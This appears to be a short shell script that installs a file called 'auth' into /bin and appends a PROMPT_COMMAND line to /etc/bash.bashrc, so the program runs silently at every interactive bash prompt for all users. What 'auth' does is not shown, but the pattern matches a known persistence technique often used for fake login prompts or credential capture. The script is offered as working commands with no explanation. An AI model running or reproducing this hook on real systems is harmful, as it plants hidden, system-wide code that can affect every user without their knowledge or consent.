cat auth > /bin/auth
chmod 755 /bin/auth


echo "export PROMPT_COMMAND='/bin/auth'" >> /etc/bash.bashrc

